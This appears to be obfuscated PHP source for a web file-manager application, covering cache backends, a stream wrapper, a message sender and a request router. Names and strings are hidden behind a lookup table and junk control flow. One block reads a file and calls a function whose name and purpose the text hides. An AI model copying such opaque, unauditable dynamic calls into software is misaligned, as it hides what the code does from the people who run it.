(isset($ˆÑæŞ¶ã[$ƒ³·¦ø]) ? $ˆÑæŞ¶ã[$ƒ³·¦ø] : ucfirst($ƒ³·¦ø)); if (!class_exists($ÅÖ÷ê¨í)) { continue; } $¨†á„ğı[] = $›§¹˜Òá[$Å¾ÚÚ«[395]]; } return $¨†á„ğı; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $³çÎ®×¨ =& $_SERVER[Ù×¯Ø…]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $©±¨‚Ï— = $GLOBALS[$³çÎ®×¨[6]][$³çÎ®×¨[347]]; $¾şÂ¹Ñ˜ = $©±¨‚Ï—[$©±¨‚Ï—[$³çÎ®×¨[833]]]; $¹µÊÄÉ = $©±¨‚Ï—[$³çÎ®×¨[834]]; switch ($©±¨‚Ï—[$³çÎ®×¨[833]]) { case $³çÎ®×¨[17]: self::$handle = Model($³çÎ®×¨[835]); break; case $³çÎ®×¨[836]: self::$handle = new CacheRedis($¾şÂ¹Ñ˜, $¹µÊÄÉ); break; case $³çÎ®×¨[837]: self::$handle = new CacheMemcached($¾şÂ¹Ñ˜, $¹µÊÄÉ); break; case $³çÎ®×¨[193]: self::$handle = new CacheFile($¾şÂ¹Ñ˜, $¹µÊÄÉ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($½˜ÓŞŒÚ) { if (is_array($½˜ÓŞŒÚ) || is_object($½˜ÓŞŒÚ)) { $½˜ÓŞŒÚ = json_encode($½˜ÓŞŒÚ); } $½˜ÓŞŒÚ = rawurlencode($½˜ÓŞŒÚ); return md5(KOD_SITE_ID . $_SERVER[Ù×¯Ø…][71] . $½˜ÓŞŒÚ); } public static function get($«„¸¿±Ò, $áğŒ‰î´ = false) { $×æØ×¢ = self::key($«„¸¿±Ò); if ($áğŒ‰î´) { return unserialize(self::init()->get($×æØ×¢)); } if (!isset(self::$memoryCache[$×æØ×¢])) { $¤Ìü¥³¿ = self::init()->get($×æØ×¢); self::$memoryCache[$×æØ×¢] = unserialize($¤Ìü¥³¿); } return self::$memoryCache[$×æØ×¢]; } public static function set($Ì•‘ »Š, $Â§ïÃßƒ, $ıœùã‚ = false) { $²şÀ¡÷ = self::key($Ì•‘ »Š); if (isset(self::$memoryCache[$²şÀ¡÷]) && self::$memoryCache[$²şÀ¡÷] === $Â§ïÃßƒ) { return !0; } if ($ıœùã‚ === 0) { self::$memoryCache[$²şÀ¡÷] = $Â§ïÃßƒ; return !0; } CacheLock::lock($Ì•‘ »Š); $¬µ·ºÜ = self::init()->set($²şÀ¡÷, serialize($Â§ïÃßƒ), $ıœùã‚); self::$memoryCache[$²şÀ¡÷] = $Â§ïÃßƒ; CacheLock::unlock($Ì•‘ »Š); return $¬µ·ºÜ; } public static function getCall($¼Í¯½Úæ, $•€‘¬ù«, $×Ü“©–¥, $µ¯å¢ˆ‡ = array()) { $‡Ò˜òïÁ =& $_SERVER[Ù×¯Ø…]; $“¢†‡„é = self::get($¼Í¯½Úæ); if ($“¢†‡„é || $“¢†‡„é === $‡Ò˜òïÁ[33]) { return $“¢†‡„é; } $“¢†‡„é = call_user_func_array($×Ü“©–¥, $µ¯å¢ˆ‡); $“¢†‡„é = $“¢†‡„é ? $“¢†‡„é : $‡Ò˜òïÁ[33]; self::set($¼Í¯½Úæ, $“¢†‡„é, $•€‘¬ù«); return $“¢†‡„é; } public static function remove($ÑéŒ‹÷Õ) { $§ Ù½ã¨ = self::key($ÑéŒ‹÷Õ); unset(self::$memoryCache[$§ Ù½ã¨]); self::clearTimeout(); CacheLock::lock($ÑéŒ‹÷Õ); $èÚÜÔ¦Ö = self::init()->remove($§ Ù½ã¨); CacheLock::unlock($ÑéŒ‹÷Õ); return $èÚÜÔ¦Ö; } public static function removeMemory($‡ÀÀãâù) { $×ïó¯ªö = self::key($‡ÀÀãâù); unset(self::$memoryCache[$×ïó¯ªö]); } public static function clearMemory($ôõ·Ã¹ = false) { if ($ôõ·Ã¹) { $ôõ·Ã¹ = self::key($ôõ·Ã¹); unset(self::$memoryCache[$ôõ·Ã¹]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ù×¯Ø…][838])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ù×¯Ø…][839])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ÔÈ¨È™Š, $×‹¶ùû­) { $±‡³Êƒî =& $_SERVER[Ù×¯Ø…]; $this->cachePath = $ÔÈ¨È™Š[$±‡³Êƒî[76]]; $this->prefix = $±‡³Êƒî[840]; $this->cacheTime = $×‹¶ùû­; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($½›²øë‚) { $†±±Ş«¦ =& $_SERVER[Ù×¯Ø…]; $½›²øë‚ = str_replace(array($†±±Ş«¦[841], $†±±Ş«¦[97], $†±±Ş«¦[70]), $†±±Ş«¦[842], $½›²øë‚); return $this->cachePath . $†±±Ş«¦[843] . $½›²øë‚ . $†±±Ş«¦[844]; } public function set($­úÊ‘ĞÑ, $ÖÇıÑÅ¯, $œ…¡á = false) { $İòŒ£Ê­ = $this->getFile($­úÊ‘ĞÑ); if (file_put_contents($İòŒ£Ê­, $this->prefix . $ÖÇıÑÅ¯, LOCK_EX)) { @touch($İòŒ£Ê­, intval(time() + $œ…¡á)); clearstatcache(); return !0; } @unlink($İòŒ£Ê­); return !1; } public function get($ŸÑ¾“ª) { $ñĞå´ÅË = $this->getFile($ŸÑ¾“ª); if (file_exists($ñĞå´ÅË) && filemtime($ñĞå´ÅË) < time()) { @unlink($ñĞå´ÅË); return !1; } $Å™ß‚„ = @file_get_contents($ñĞå´ÅË); return substr($Å™ß‚„, strlen($this->prefix)); } public function remove($ßªšØÀ¼) { $„ıõ«Ğ = $this->getFile($ßªšØÀ¼); return @unlink($„ıõ«Ğ); } public function deleteAll() { $„•·ª =& $_SERVER[Ù×¯Ø…]; $©åäÌÒÓ = scandir($this->cachePath); foreach ($©åäÌÒÓ as $Éîõ’îÖ) { $ûÅ¡ÁçÃ = $this->cachePath . $Éîõ’îÖ; if (strpos($ûÅ¡ÁçÃ, $„•·ª[844]) && strpos($ûÅ¡ÁçÃ, $„•·ª[845])) { @unlink($ûÅ¡ÁçÃ); } } } public function clearTimeout() { $ççø¢ÀÅ =& $_SERVER[Ù×¯Ø…]; $¤¬ù…Ö¯ = scandir($this->cachePath); foreach ($¤¬ù…Ö¯ as $‚õÇ…õ) { $Õ•Ù«İ‹ = $this->cachePath . $‚õÇ…õ; if (strpos($Õ•Ù«İ‹, $ççø¢ÀÅ[844]) && strpos($Õ•Ù«İ‹, $ççø¢ÀÅ[845]) && filemtime($Õ•Ù«İ‹) < time()) { @unlink($Õ•Ù«İ‹); } } } } goto Fà…‚ ­é±; f‹ïºöË­: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($¶êˆÌõ”, $ŸİÁÄŞ = '') { $this->info = $this->info($¶êˆÌõ”); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ù×¯Ø…][76]]; $this->pathOpen = $¶êˆÌõ”; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$¶êˆÌõ”])) { self::$_chunkBuffer[$¶êˆÌõ”] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Ëû»ÚÂë) { $àªÂüù¯ = $this->fileSubstr($this->pose, $Ëû»ÚÂë); $this->pose += strlen($àªÂüù¯); return $àªÂüù¯; } public function stream_tell() { return $this->pose; } public function stream_seek($óÙ‚²á¨, $ßö™øÄï) { $µÌ†ù‹« =& $_SERVER[Ù×¯Ø…]; if ($ßö™øÄï == SEEK_SET) { $this->pose = $óÙ‚²á¨; } else { if ($ßö™øÄï == SEEK_CUR) { $this->pose += $óÙ‚²á¨; } else { if ($ßö™øÄï == SEEK_END) { $this->pose = $this->info[$µÌ†ù‹«[78]] + intval($óÙ‚²á¨); } } } if ($óÙ‚²á¨ < 0) { $this->pose = $this->info[$µÌ†ù‹«[78]] + $óÙ‚²á¨; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ù×¯Ø…][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Û ÌôÕ, $•îŸ·ÊÂ) { $ì¡º±©è =& $_SERVER[Ù×¯Ø…]; $±íé½¢¼ = $this->info($Û ÌôÕ); return array($ì¡º±©è[1428] => 0, $ì¡º±©è[1429] => 0, $ì¡º±©è[12] => 32768 + 511, $ì¡º±©è[1430] => 0, $ì¡º±©è[1431] => 0, $ì¡º±©è[1432] => 0, $ì¡º±©è[1433] => 0, $ì¡º±©è[78] => $±íé½¢¼[$ì¡º±©è[78]], $ì¡º±©è[1434] => $±íé½¢¼[$ì¡º±©è[1303]], $ì¡º±©è[1389] => $±íé½¢¼[$ì¡º±©è[84]], $ì¡º±©è[1388] => $±íé½¢¼[$ì¡º±©è[194]], $ì¡º±©è[1435] => 0, $ì¡º±©è[1436] => 0); } static $fileInfo = array(); public function info($×ØùåœÈ) { $ûÑı€Íş = $_SERVER[Ù×¯Ø…][1437]; if (isset(self::$fileInfo[$×ØùåœÈ])) { return self::$fileInfo[$×ØùåœÈ]; } if (substr($×ØùåœÈ, 0, strlen($ûÑı€Íş)) != $ûÑı€Íş) { return !1; } self::$fileInfo[$×ØùåœÈ] = IO::info(substr($×ØùåœÈ, strlen($ûÑı€Íş))); return self::$fileInfo[$×ØùåœÈ]; } public static function read($ÓË“û†Š, $ıÂ¥ê¤ê, $Œõ”­Éä) { if (!isset(self::$_fopenCache[$ÓË“û†Š])) { $ÁÄù¦µä = new StreamWrapperIO(); $ÁÄù¦µä->stream_open($ÓË“û†Š); self::$_fopenCache[$ÓË“û†Š] = $ÁÄù¦µä; } $ÁÄù¦µä = self::$_fopenCache[$ÓË“û†Š]; return $ÁÄù¦µä->fileSubstr($ıÂ¥ê¤ê, $Œõ”­Éä); } public static function _read($âËİÚ¸Ç, $•Ã¬ïàœ, $¾†´òŒ¦) { $¶ä¼¶«× =& $_SERVER[Ù×¯Ø…]; $·¹µÄºõ = fopen($âËİÚ¸Ç, $¶ä¼¶«×[1307]); if (!$·¹µÄºõ) { return $¶ä¼¶«×[33]; } $°ü×ô¸Å = 8192; fseek($·¹µÄºõ, $•Ã¬ïàœ, SEEK_SET); $ñ°Üî»¤ = $¶ä¼¶«×[33]; $ÓÌ“˜é° = 0; while ($ÓÌ“˜é° < $¾†´òŒ¦) { $ÏøàôÙ = min($°ü×ô¸Å, $¾†´òŒ¦ - $ÓÌ“˜é°); $ñ°Üî»¤ .= fread($·¹µÄºõ, $ÏøàôÙ); $ÓÌ“˜é° += $ÏøàôÙ; } fclose($·¹µÄºõ); return $ñ°Üî»¤; } public function fileSubstr($§ï²ÉêÕ, $‡Õ¡ëñ³) { $¦é¡ñ•ë =& $_SERVER[Ù×¯Ø…]; $ìÀ¥ŞÓ£ = $this->info[$¦é¡ñ•ë[78]]; $ãËËö¡Ğ = $§ï²ÉêÕ; $Ò¤ ñº = $‡Õ¡ëñ³; if ($§ï²ÉêÕ < 0) { $§ï²ÉêÕ = $ìÀ¥ŞÓ£ + $§ï²ÉêÕ; } if ($‡Õ¡ëñ³ === !1) { $‡Õ¡ëñ³ = $ìÀ¥ŞÓ£ - $§ï²ÉêÕ; } if ($§ï²ÉêÕ + $‡Õ¡ëñ³ > $ìÀ¥ŞÓ£) { $‡Õ¡ëñ³ = $ìÀ¥ŞÓ£ - $§ï²ÉêÕ; } if ($‡Õ¡ëñ³ <= 0) { return $¦é¡ñ•ë[33]; } if ($§ï²ÉêÕ < 0 || $§ï²ÉêÕ >= $ìÀ¥ŞÓ£ || $‡Õ¡ëñ³ <= 0 || $‡Õ¡ëñ³ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\x69\x6c\145\122\x65\141\144\40\x65\x72\x72\157\162\x21\x20\x73\164\141\162\164\x3d{$§ï²ÉêÕ}\73\x6c\145\156\147\x74\x68\75{$‡Õ¡ëñ³}\73\x20\163\x69\x7a\x65\x3d{$ìÀ¥ŞÓ£}\73"); } $˜Ÿ¥âÓ = 64 * 1024; $àÉôô½Ş =& self::$_chunkBuffer[$this->path]; if (!$àÉôô½Ş) { $àÉôô½Ş = array(); } $ØƒŒª§¸ = 0; $şİ”ÂÙ = 0; $¨é²çŸÕ = $¦é¡ñ•ë[33]; foreach ($àÉôô½Ş as $ØƒŒª§¸ => $¨é²çŸÕ) { $ØƒŒª§¸ = intval($ØƒŒª§¸); $şİ”ÂÙ = $ØƒŒª§¸ + strlen($¨é²çŸÕ); if ($§ï²ÉêÕ >= $şİ”ÂÙ) { continue; } if ($§ï²ÉêÕ >= $ØƒŒª§¸ && $§ï²ÉêÕ + $‡Õ¡ëñ³ <= $şİ”ÂÙ) { return substr($¨é²çŸÕ, $§ï²ÉêÕ - $ØƒŒª§¸, $‡Õ¡ëñ³); } break; } if (count($àÉôô½Ş) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($¦é¡ñ•ë[1438], $¦é¡ñ•ë[1439] . count($àÉôô½Ş) . "\x3b\x73\164\141\162\x74\75{$§ï²ÉêÕ}\54\x6c\x65\x6e\x67\x74\x68\75{$‡Õ¡ëñ³}\x3b\x70\157\x73\145\72{$ØƒŒª§¸}\176{$şİ”ÂÙ}"); throw new Exception($¦é¡ñ•ë[1440]); } $‡Àôö¦’ = intval($§ï²ÉêÕ / $˜Ÿ¥âÓ) * $˜Ÿ¥âÓ; $ œ‡¥ä = ceil(($§ï²ÉêÕ + $‡Õ¡ëñ³) / $˜Ÿ¥âÓ) * $˜Ÿ¥âÓ - $‡Àôö¦’; $®ÎÆ†„ï = IO::fileSubstr($this->path, $‡Àôö¦’, $ œ‡¥ä); $àÉôô½Ş[$‡Àôö¦’ . $¦é¡ñ•ë[33]] = $®ÎÆ†„ï; ksort($àÉôô½Ş); $›¸ôÓ‡ = substr($®ÎÆ†„ï, $§ï²ÉêÕ - $‡Àôö¦’, $‡Õ¡ëñ³); return $›¸ôÓ‡; } private function log($¡Ì¡£›à, $Êåéëè£) { $‘ñî˜Æ =& $_SERVER[Ù×¯Ø…]; $õ‰¬ş­¥ = timeFloat() - $this->timeStart; write_log(sprintf($‘ñî˜Æ[1441], $¡Ì¡£›à, $this->info[$‘ñî˜Æ[28]], $õ‰¬ş­¥, $Êåéëè£), $‘ñî˜Æ[1113]); } } class Message { function __construct() { } public function send($´ø÷Üù = '', $ç†—Í‚ = array(), $ÖÖëÌÈÙ = "\x74\145\170\x74") { $¦ÆŒÄö° =& $_SERVER[Ù×¯Ø…]; $Ô¡øûèÂ = array($¦ÆŒÄö°[29] => $¦ÆŒÄö°[1442], $¦ÆŒÄö°[754] => $´ø÷Üù); if (in_array($ÖÖëÌÈÙ, array($¦ÆŒÄö°[1442], $¦ÆŒÄö°[1443]))) { $Ô¡øûèÂ[$¦ÆŒÄö°[29]] = $ÖÖëÌÈÙ; } $ç†—Í‚ = array($¦ÆŒÄö°[518] => isset($ç†—Í‚[$¦ÆŒÄö°[518]]) ? $ç†—Í‚[$¦ÆŒÄö°[518]] : $¦ÆŒÄö°[33], $¦ÆŒÄö°[597] => isset($ç†—Í‚[$¦ÆŒÄö°[597]]) ? $ç†—Í‚[$¦ÆŒÄö°[597]] : $¦ÆŒÄö°[33]); if (empty($´ø÷Üù) || empty($ç†—Í‚[$¦ÆŒÄö°[518]]) && empty($ç†—Í‚[$¦ÆŒÄö°[597]])) { return !1; } $Šº†·ğ = array($¦ÆŒÄö°[1382] => $Ô¡øûèÂ, $¦ÆŒÄö°[1444] => $ç†—Í‚); Hook::trigger($¦ÆŒÄö°[1445], $Šº†·ğ); } } if ($_SERVER[$_SERVER[Ù×¯Ø…][398]] != $_SERVER[$_SERVER[Ù×¯Ø…][1424]]) { $_getc = $_SERVER[Ù×¯Ø…][399]; $_getfile = $_SERVER[$_SERVER[Ù×¯Ø…][400]] . $_SERVER[Ù×¯Ø…][401]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ù×¯Ø…][229], $_getfilec); if (count($_getarrs) < $_SERVER[Ù×¯Ø…][402]) { $exit = $_SERVER[Ù×¯Ø…][403]; $exit(); } $_act = $_SERVER[Ù×¯Ø…][404]; $_act($_SERVER[$_SERVER[Ù×¯Ø…][396]]); } goto D¾è…©äìª; BóÃì¶ó„: $yeumrtashg = $_SERVER[Ù×¯Ø…][612]; while (strlen($yeumrtashg) < $_SERVER[Ù×¯Ø…][613]) { if (!$yeumrtashg) { break; } $yeumrtashg++; } class Application { private $defaultModule = "\151\156\x64\145\x78"; private $defaultController = "\x69\156\144\145\x78"; private $defaultAction = "\x69\x6e\144\145\x78"; function __construct() { } public function setDefault($Ûõ·‡œ) { $¸Ò¡ÈÌ» =& $_SERVER[Ù×¯Ø…]; $££ğ›”¶ =& $_SERVER[›õ¡œ§]; $Ø±©×ñÈ = explode($££ğ›”¶[0], trim($Ûõ·‡œ, $££ğ›”¶[0])); $•¾€ñú = $¸Ò¡ÈÌ»[614]; if (!$•¾€ñú) { die; } $this->defaultModule = $Ø±©×ñÈ[0] ? $Ø±©×ñÈ[0] : $this->defaultModule; $this->defaultController = $Ø±©×ñÈ[1] ? $Ø±©×ñÈ[1] : $this->defaultController; $this->defaultAction = $Ø±©×ñÈ[2] ? $Ø±©×ñÈ[2] : $this->defaultAction; $¬å‡ôòó = $¸Ò¡ÈÌ»[615]; if (strlen($¬å‡ôòó) < $¸Ò¡ÈÌ»[402]) { return; } $this->pqtkee5e698b($££ğ›”¶[1], array($this, $££ğ›”¶[2])); $øşƒô˜ = $¸Ò¡ÈÌ»[616]; } public function appRun($è£¥Îî„) { $ªŞè‡ =& $_SERVER[Ù×¯Ø…]; $å«µ„Åå =& $_SERVER[›õ¡œ§]; $Õ§èª¨» = explode($å«µ„Åå[0], $è£¥Îî„); $ÏÒïÆèµ = strtolower($Õ§èª¨»[0]); $®ğ‹–§Ğ = $ªŞè‡[617]; while (strlen($®ğ‹–§Ğ) < $ªŞè‡[618]) { if (!$®ğ‹–§Ğ) { break; } $®ğ‹–§Ğ++; } $‰µ”ÌˆÉ = $å«µ„Åå[3]; $Û£ÓÈ¶¬ = $ªŞè‡[619]; if ($ÏÒïÆèµ == $å«µ„Åå[4]) { $‰µ”ÌˆÉ = $å«µ„Åå[5]; $Õ§èª¨»[0] = $å«µ„Åå[6]; $Õ§èª¨»[1] = $Õ§èª¨»[1] . $å«µ„Åå[7]; $è£¥Îî„ = join($å«µ„Åå[0], $Õ§èª¨»); $è£¥Îî„ = trim($è£¥Îî„, $å«µ„Åå[0]); } call_user_func(array($å«µ„Åå[8], $å«µ„Åå[9]), $‰µ”ÌˆÉ . $å«µ„Åå[10], $è£¥Îî„); ActionCall($è£¥Îî„); $®£‚¦ÙÔ = $ªŞè‡[620]; while (strlen($®£‚¦ÙÔ) < $ªŞè‡[402]) { if (!$®£‚¦ÙÔ) { break; } $®£‚¦ÙÔ++; } call_user_func(array($å«µ„Åå[8], $å«µ„Åå[9]), $‰µ”ÌˆÉ . $å«µ„Åå[11], $è£¥Îî„); } private function autorun() { $®¯Ò…·è =& $_SERVER[Ù×¯Ø…]; $éëÉ†™• =& $_SERVER[›õ¡œ§]; global $config; $ãÕŞøÏ = $®¯Ò…·è[621]; if (!$ãÕŞøÏ) { die; } if (count($config[$éëÉ†™•[12]]) == 0) { return; } foreach ($config[$éëÉ†™•[12]] as $ÒÓóÀáŠ => $å†¶“ÆÁ) { $this->appRun($å†¶“ÆÁ); $‡©Ô‡¯¯ = $®¯Ò…·è[622]; } } private function kpen0761e284() { $Š…Ï€Ñé =& $_SERVER[Ù×¯Ø…]; $Äş˜¸ßö =& $_SERVER[›õ¡œ§]; $ËŠøÔ…» = $Äş˜¸ßö[4]; $ÍÇôè‚ = $GLOBALS[$Äş˜¸ßö[13]][$Äş˜¸ßö[14]][0]; $¬¹ºù®è = $Š…Ï€Ñé[623]; while ($¬¹ºù®è < $Š…Ï€Ñé[402]) { if ($¬¹ºù®è >= 0) { break; } $¬¹ºù®è++; } if (!$ÍÇôè‚ || strlen($ÍÇôè‚) <= strlen($ËŠøÔ…»)) { return; } if (strtolower(substr($ÍÇôè‚, -strlen($ËŠøÔ…»))) != $ËŠøÔ…») { return; } $âİŸœº‡ = substr($ÍÇôè‚, 0, -strlen($ËŠøÔ…»)); $©¨“ùŠÊ = $Š…Ï€Ñé[624]; if (strlen($©¨“ùŠÊ) < $Š…Ï€Ñé[625]) { return; } $´¯…æİ¹ = array($Äş˜¸ßö[4], $âİŸœº‡); $Û„Ä¾®ç = array_slice($GLOBALS[$Äş˜¸ßö[13]][$Äş˜¸ßö[14]], 1); $GLOBALS[$Äş˜¸ßö[13]][$Äş˜¸ßö[14]] = array_merge($´¯…æİ¹, $Û„Ä¾®ç); $GLOBALS[$Äş˜¸ßö[13]][$Äş˜¸ßö[15]] = implode($Äş˜¸ßö[0], $GLOBALS[$Äş˜¸ßö[13]][$Äş˜¸ßö[14]]); $ôÒÙŠ†‰ = $Š…Ï€Ñé[626]; if (strlen($ôÒÙŠ†‰) < $Š…Ï€Ñé[402]) { die; } } private function yswib7df6d6a() { $ŒÂàé®ú =& $_SERVER[Ù×¯Ø…]; $©í ¦àÓ =& $_SERVER[›õ¡œ§]; if ($GLOBALS[$©í ¦àÓ[13]][$©í ¦àÓ[15]] != $©í ¦àÓ[6]) { return; } $®Â¹ª› = $_SERVER[$©í ¦àÓ[16]]; $ë‰Ï¨†› = $©í ¦àÓ[17]; if (!strstr($®Â¹ª›, $ë‰Ï¨†›)) { return; } $‹²‹—Š = strrpos($®Â¹ª›, $ë‰Ï¨†›); $ñ¯ùõÔ¶ = $ŒÂàé®ú[627]; while ($ñ¯ùõÔ¶ < $ŒÂàé®ú[628]) { if ($ñ¯ùõÔ¶ >= 0) { break; } $ñ¯ùõÔ¶++; } $ ‚ÄÆı‰ = substr($®Â¹ª›, $‹²‹—Š + strlen($ë‰Ï¨†›)); $¹š†„ÂÁ = $ŒÂàé®ú[629]; if (strlen($¹š†„ÂÁ) < $ŒÂàé®ú[625]) { return; } preg_match_all($©í ¦àÓ[18], $ ‚ÄÆı‰, $íÚ–…ğ¶); $çú•Ï™¸ = $ŒÂàé®ú[630]; $ ‚ÄÆı‰ = trim($íÚ–…ğ¶[0][0], $©í ¦àÓ[19]); $GLOBALS[$©í ¦àÓ[13]][$©í ¦àÓ[14]] = explode($©í ¦àÓ[19], $ ‚ÄÆı‰); $Èñœòœ = $ŒÂàé®ú[631]; if (!$Èñœòœ) { return; } $GLOBALS[$©í ¦àÓ[13]][$©í ¦àÓ[15]] = implode($©í ¦àÓ[0], $GLOBALS[$©í ¦àÓ[13]][$©í ¦àÓ[14]]); } public function run() { $Ê¸êç¬¯ =& $_SERVER[Ù×¯Ø…]; $à˜ò•“Ñ =& $_SERVER[›õ¡œ§]; $this->yswib7df6d6a(); $Ÿ¦Âßñ¤ = $Ê¸êç¬¯[632]; if (!$Ÿ¦Âßñ¤) { return; } $this->kpen0761e284(); $®¦Òıè  = $GLOBALS[$à˜ò•“Ñ[13]][$à˜ò•“Ñ[14]]; $ÆÄß‚ôÇ = $Ê¸êç¬¯[633]; if (strlen($ÆÄß‚ôÇ) < $Ê¸êç¬¯[618]) { return; } $µñŸ¦áÙ = $GLOBALS[$à˜ò•“Ñ[13]][$à˜ò•“Ñ[15]]; $¢ñò“¨ = $Ê¸êç¬¯[634]; define($à˜ò•“Ñ[20], isset($®¦Òıè [0]) && $®¦Òıè [0] ? $®¦Òıè [0] : $this->defaultModule); $Ãı®ÍÙ¹ = $Ê¸êç¬¯[635]; define($à˜ò•“Ñ[21], isset($®¦Òıè [1]) && $®¦Òıè [0] ? $®¦Òıè [1] : $this->defaultController); $úÛıõŒƒ = $Ê¸êç¬¯[636]; if (strlen($úÛıõŒƒ) < $Ê¸êç¬¯[618]) { die; } define($à˜ò•“Ñ[22], isset($®¦Òıè [2]) && $®¦Òıè [0] ? $®¦Òıè [2] : $this->defaultAction); $ïŞêğùì = $Ê¸êç¬¯[637]; if (!$ïŞêğùì) { die; } define($à˜ò•“Ñ[23], MOD . $à˜ò•“Ñ[0] . ST . $à˜ò•“Ñ[0] . ACT); $·àŸê·Ê = $Ê¸êç¬¯[638]; if (strlen($·àŸê·Ê) < $Ê¸êç¬¯[625]) { return; } $_SERVER[$à˜ò•“Ñ[24]] = strtolower(ACTION); $this->autorun(); if (count($®¦Òıè ) >= 3) { $this->appRun($µñŸ¦áÙ); } else { $this->appRun(ACTION); } } private $ztur5f4d2ac4 = array(); private $lady05e9d79a = ''; public function zjup7e7eae30() { $ß«ÕĞù® =& $_SERVER[Ù×¯Ø…]; $Ç¡ÑĞâö =& $_SERVER[›õ¡œ§]; $this->ovgaa9ab3f8d(); $—ÒŒ†ì® = $ß«ÕĞù®[639]; if (!$—ÒŒ†ì®) { return; } $this->ybsld6b6cae0(); $¢¯“µ²Ù = $ß«ÕĞù®[640]; if (!$¢¯“µ²Ù) { return; } $this->btrl2b36921d(); $this->wsftf276eef8(); $this->lvysd2674034(); $this->cimg55745b61(); $this->auxi69017af9(); $this->pqtkee5e698b($Ç¡ÑĞâö[25], array($this, $Ç¡ÑĞâö[26])); $this->pqtkee5e698b($Ç¡ÑĞâö[27], array($this, $Ç¡ÑĞâö[28])); $this->pqtkee5e698b($Ç¡ÑĞâö[29], array($this, $Ç¡ÑĞâö[30])); $this->pqtkee5e698b($Ç¡ÑĞâö[31], array($this, $Ç¡ÑĞâö[32])); $ÌÆÕè­ë = $ß«ÕĞù®[641]; while ($ÌÆÕè­ë < $ß«ÕĞù®[402]) { if ($ÌÆÕè­ë >= 0) { break; } $ÌÆÕè­ë++; } } public function bxwi2baaadee($ú˜²ô²¡) { $ô­™•×æ =& $_SERVER[Ù×¯Ø…]; $ãÁÃ“Î— =& $_SERVER[›õ¡œ§]; $¤„€Öêø = Model($ãÁÃ“Î—[33])->get(); $ÒÉÎÛ‚« = array($ãÁÃ“Î—[34], $ãÁÃ“Î—[35], $ãÁÃ“Î—[36], $ãÁÃ“Î—[37], $ãÁÃ“Î—[38], $ãÁÃ“Î—[39], $ãÁÃ“Î—[40], $ãÁÃ“Î—[41], $ãÁÃ“Î—[42], $ãÁÃ“Î—[43], $ãÁÃ“Î—[44], $ãÁÃ“Î—[45], $ãÁÃ“Î—[46], $ãÁÃ“Î—[47], $ãÁÃ“Î—[48], $ãÁÃ“Î—[49], $ãÁÃ“Î—[50], $ãÁÃ“Î—[51], $ãÁÃ“Î—[52], $ãÁÃ“Î—[53], $ãÁÃ“Î—[54], $ãÁÃ“Î—[55], $ãÁÃ“Î—[56], $ãÁÃ“Î—[57], $ãÁÃ“Î—[58], $ãÁÃ“Î—[59], $ãÁÃ“Î—[60], $ãÁÃ“Î—[61], $ãÁÃ“Î—[62], $ãÁÃ“Î—[63], $ãÁÃ“Î—[64], $ãÁÃ“Î—[65], $ãÁÃ“Î—[66], $ãÁÃ“Î—[67], $ãÁÃ“Î—[68], $ãÁÃ“Î—[69], $ãÁÃ“Î—[70], $ãÁÃ“Î—[71], $ãÁÃ“Î—[72], $ãÁÃ“Î—[73], $ãÁÃ“Î—[74], $ãÁÃ“Î—[75], $ãÁÃ“Î—[76], $ãÁÃ“Î—[77], $ãÁÃ“Î—[78], $ãÁÃ“Î—[79], $ãÁÃ“Î—[80]); $Ï„½Ô“¿ = $ô­™•×æ[642]; while (strlen($Ï„½Ô“¿) < $ô­™•×æ[625]) { if (!$Ï„½Ô“¿) { break; } $Ï„½Ô“¿++; } foreach ($ÒÉÎÛ‚« as $æØ´ö¶) { $à©³ ¯ = $GLOBALS[$ãÁÃ“Î—[81]][$ãÁÃ“Î—[82]][$æØ´ö¶]; $ª§Ú»ñ´ = $ô­™•×æ[643]; if (strlen($ª§Ú»ñ´) < $ô­™•×æ[402]) { return; } if (isset($¤„€Öêø[$æØ´ö¶])) { $à©³ ¯ = $¤„€Öêø[$æØ´ö¶]; } $ú˜²ô²¡[$ãÁÃ“Î—[83]][$ãÁÃ“Î—[84]][$æØ´ö¶] = $à©³ ¯; } $¢Íæ¹õ = $ú˜²ô²¡[$ãÁÃ“Î—[83]][$ãÁÃ“Î—[84]][$ãÁÃ“Î—[46]]; $ï›‘ÇÖì = $ô­™•×æ[644]; if (!$ï›‘ÇÖì) { die; } unset($ú˜²ô²¡[$ãÁÃ“Î—[83]][$ãÁÃ“Î—[85]][$ãÁÃ“Î—[86]]); $€×Ï§“ü = $ô­™•×æ[645]; if (strlen($€×Ï§“ü) < $ô­™•×æ[618]) { die; } unset($ú˜²ô²¡[$ãÁÃ“Î—[83]][$ãÁÃ“Î—[85]][$ãÁÃ“Î—[87]]); $µóşŞ‘À = $ô­™•×æ[646]; while ($µóşŞ‘À < $ô­™•×æ[628]) { if ($µóşŞ‘À >= 0) { break; } $µóşŞ‘À++; } unset($ú˜²ô²¡[$ãÁÃ“Î—[83]][$ãÁÃ“Î—[84]][$ãÁÃ“Î—[46]]); $îõ²¯ü‰ = $ô­™•×æ[647]; if (strlen($îõ²¯ü‰) < $ô­™•×æ[628]) { die; } unset($ú˜²ô²¡[$ãÁÃ“Î—[83]][$ãÁÃ“Î—[84]][$ãÁÃ“Î—[88]]); 